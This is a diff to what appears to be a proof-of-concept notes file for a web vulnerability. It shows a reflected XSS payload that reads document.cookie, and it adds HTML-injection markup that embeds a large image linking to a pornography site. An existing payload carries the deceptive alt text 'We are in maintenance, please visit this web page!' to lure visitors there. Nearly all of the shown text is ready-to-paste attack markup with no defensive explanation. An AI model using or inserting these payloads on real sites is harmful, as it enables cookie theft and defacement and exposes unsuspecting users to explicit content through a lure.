@@ -76,6 +76,14 @@ nu11secur1ty<script>alert(document.cookie)</script>
 ```
 
 - 0.5.4 - Stupid Reflected blow 0ut
+- - AN
+
+```
+<a href="https://www.pornhub.com" target="_blank">
+	<img src="https://el.phncdn.com/gif/45467111.gif" alt="STUPID"width="900" height="450">
+</a>
+```
+
 ```
 <a href="https://www.pornhub.com/view_video.php?viewkey=ph61f4241e1d586" target="_blank" rel="noopener nofollow ugc">
 <img src="https://dl.phncdn.com/gif/41165761.gif??token=GHSAT0AAAAAABXWGSKOH7MBFLEKF4M6Y3YCYYKADTQ&rs=1" style="border:1px solid black;max-width:100%;" alt="We are in maintenance, please visit this web page!">
